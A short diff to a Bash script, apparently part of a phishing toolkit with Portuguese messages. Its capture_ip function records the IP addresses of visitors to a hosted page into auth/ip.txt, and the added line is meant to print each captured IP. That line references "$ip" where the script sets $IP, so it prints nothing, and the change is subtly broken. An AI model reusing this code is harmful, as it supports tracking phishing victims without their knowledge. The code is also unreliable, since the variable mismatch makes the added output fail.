@@ -282,6 +282,7 @@ capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${CYAN}${ICON_INFO}${RESET} ${GRAY}Novo acesso registrado${RESET}\n"
+	printf "${CYAN}${ICON_NET}${RESET} ${GRAY}IP:${RESET} ${WHITE}%s${RESET}\n" "$ip"
 	echo -ne "${GREEN}${ICON_OK}${RESET} ${GRAY}Salvo em:${RESET} ${WHITE}auth/ip.tx${RESET}\n"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
